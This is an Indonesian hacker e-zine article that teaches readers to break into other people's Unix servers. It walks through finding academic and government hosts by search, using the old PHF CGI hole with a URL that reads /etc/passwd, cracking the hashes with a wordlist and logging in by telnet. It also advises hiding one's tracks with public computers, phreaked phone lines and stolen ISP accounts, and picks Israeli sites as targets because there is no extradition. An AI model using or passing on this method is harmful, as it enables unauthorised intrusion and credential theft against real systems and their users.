@@ -1,0 +1,131 @@
+Terbitan Online Kecoak Elektronik
+http://k-elektronik.org
+
+
+
+=================================================================================
+INSTANT SHELL UNIX
+Oleh: LithErr - LithiumError (Kecoak Elektronik)
+=================================================================================
+
+
+Berikut adalah cara mendapatkan shell unix dalam waktu cepat buat kamu yang pingin belajar
+sambil praktek tapi nggak mampu beli/install UNIX dengan memanfaatkan eksploit yang udah
+cukup uzur cuman masih lumayan ampuh.
+
+Bahan-bahan yang diperlukan:
+
+- Web Browser (Netscape 3.0 disarankan karena cepat)
+- Program Cracker (gunakan crackerjack atau star cracker)
+- Daftar kata (Wordlist/Dictionary). Favorit gue sih GlobalKOS KOSdict.
+  Sekitar 11.2 MB uncompressed!
+- Komputer UMUM (yang nggak bisa di-trace) 
+- Komputer nganggur (sekitar 6 jam untuk file passwd ukuran medium). untuk yang satu ini nggak
+  mesti umum punya sebab fungsinya hanya untuk meng-crack
+
+Prakteknya:
+
+- Jalankan browser di komputer umummu (perpustakaan, rental)
+- buka window baru (kita sebut window #2)
+- dari window lama (window #1) jalankan altavista
+- cari target-target potensial. Untuk yang satu ini penjelasan sedikit:
+
+Target yang paling empuk adalah site-site akademis. Paling lezat kalau site-site akademis tsb
+terletak di luar negeri. Paling yahud yang ada di negeri yahudi (israel) sebab Indonesia dan israel
+tidak punya hubungan diplomatik maupun perjanjian deportasi. JANGAN coba-coba mengehack server milik
+pemerintah Indonesia! Kalian nggak akan mendapat ampun! Nah, jika kamu sudah punya sesuatu dalam
+pemikiran, contoh: site-site akademis di israel (domain= ac.il) maka
+
+- di altavista, ada kolom yang berjudul "Search the web for ..." kamu isi
+  dengan: host:ac.il , lalu pilih "search"
+- altavista akan menampilkan daftar server server yang memenuhi kriteria search kamu. modifikasi
+  sekeinginan hati. contoh: Untuk mendapatkan daftar target dari domainnya universitas Tel Aviv,
+  ketik host:tau.ac.il kamu akan dapetin nama nama webserver yang ada di sono. jadi kira-kira
+  akan muncul webpage dari server yang namanya www.tau.ac.il, www.cs.tau.ac.il dll. kalo kamu ngisi
+  host:co.jp maka yang akan ditampilin adalah host-host komersial di jepang (dlsb)
+- pergilah ke Window #2. di kolom: "Location:" ketiklah:
+  http://nama.target.kamu/cgi-bin/phf?Qalias=x/bin/cat%20/etc/passwd
+  jangan lupa mengganti nama target dengan salah satu site yang terdapat di daftar sites kamu
+  dari window #1 contoh: 
+  http://eris.wisdom.weizmann.ac.il/cgi-bin/phf?Qalias=x/bin/cat%20/etc/passwd
+
+  (percuma ngegunain host yang ada di contoh, file passwdnya kecil banget!)
+
+- Kemungkinan ada empat:
+   1. Error message ... (dalam kasus ini, maka cukup kembali ke daftar target dan coba
+      target berikutnya.
+   2. Smile, you're on candid camera! (dalam kasus ini, informasi mengenai kamu direkam, nomor
+      ip dicatat dan akan disimpan di server! Hati-hati sebab kamu udah di-log, dan bisa di-trace!
+      Karena itu pakailah kondom dan gunakan KOMPUTER UMUM! dalam kasus ini kamu cuman bisa
+      ngusep-ngusep dada aja, deh!)
+   3. muncul tulisan yang menyerupai bentuk dibawah:
+      root:*:0:0:System Administrator:/:/bin/csh
+      sysadm:*:1:1: Bokeph Memendez:/usr/adm:/bin/bash dll dll.
+
+perhatikan bahwa setelah tanda titik dua yang pertama, SELALU muncul tanda asterisk (*).
+ini artinya kamu berhasil mendapatkan file passwd hanya saja sayangnya sang file sudah di-shadow
+(nggak bisa dibaca oleh sembarang orang, perlu pangkat ROOT (tuhan) untuk ngebacanya!) Well, terpaksa
+lanjutkan ke daftar target berikutnya .... 
+
+   4. muncul tulisan yang menyerupai bentuk dibawah:
+      root:OUk9b8RqMRVNs:0:0:root,,,,,,,:/:/bin/csh
+      sysadm:*:0:0:System V Administration:/usr/admin:/bin/sh
+      diag:*:0:996:Hardware Diagnostics:/usr/diags:/bin/csh
+      leonid:F5AymuqmXVFCU:1399:8:Leonid Bebek:/usr/leonid:/bin/tcsh dll dll.
+
+(Dalam kasus ini : CREEET! Dapet deh tuh file passwd asli! tanpa shadow!)
+
+- Nah segera setelah file passwd didapatkan, "Save As" dan simpan di tempat yang aman!
+- Terserah boleh kalo mau lanjutin ke target berikut atau segera meng-crack
+- pastikan komputer untuk nge-crack aman dan bisa dibiarin nganggur selama berjamjam atau kalo
+  file passwdnya emang besar, berhari hari.
+- jalankan program crack, gunakan wordlist atas file passwd yang baru kamu panen.
+- kalo udah berhasil nge-crack, kamu udah siap untuk memakai shell unix 'baru' mu!
+  telnet aja ke servernya (jangan lupa pake komputer umum atau gunakan perlindungan (phreak dulu
+  teleponnya, login ke isp pake punya orang, dll!!!)). Isi dengan login dan passwd yang baru kamu
+  crack, silakan lihat-lihat sekitar. Kalo ada info menarik, jangan lupa dibagi-bagi!
+
+Jika kamu ingin mengeksploitasi, coba jalankan eksploit-eksploit yang ada untuk mendapatkan root!
+
+Gimana? Gampang khan? kalo enggak bisa, sih , kebangetan banget! Gitu dulu deh! Semoga ada manfaatnya!
+
+Catatan PENTING:
+JUNJUNGLAH ETIKA HACKER!!!! Jangan merusak!!! Jika kamu berhasil masuk (dan mendapatkan root).
+Jangan, sekali lagi JANGAN jalankan perintah/program apapun yang kamu tidak tahu apa efeknya.
+Pelajari bukumu, jalankan perintah-perintah sesuai petunjuk buku. JANGAN coba-coba menjalankan
+eksploit tanpa tahu asal usul maupun pengertian mendalam tentang UNIX. Tulisan ini gue tulis dengan
+maksud supaya kamu bisa mendapatkan sarana untuk belajar UNIX sebab gue percaya bahwa keinginan untuk
+belajar tidak sepantasnya dihalangi oleh faktor ekonomi.
+
+Catatan 1:
+File passwd yang kamu dapat masih dalam bentuk terenkripsi, jadi kalo
+dilihat:
+
+root:2/.,1wEYqm3m3Q:Root Account:/:/bin/csh
+| |
+nama account |
+password terenkripsi/tersandi
+
+cara kerja program cracker adalah kurang lebih seperti ini:
+
+1. baca kata #1 dari file kamus/wordlist
+2. enkripisi dengan algoritma DES
+3. baca baris 1 dari file passwd (account 1), baca nama account dan passwd terenkripsi
+4. bandingkan apakah kata#1terenkripsi = passwd1terenkripsi
+5. ya? beritahukan user/catat di log, tidak? baca baris2 file passwd, then.
+
+catatan 2:
+domain domain yang terkenal empuk:
+ac.jp (akademis jepang)
+ac.kr (akademis korea)
+.edu (akademis amrik)
+ac.uk (akademis inggris)
+go.kr (pemerintah korea)
+go.in (pemerintah india)
+ac.ir (akademis iran)
+com.il (komersil israel) dll dll.
+
+
+
+Ciao
+LithErr
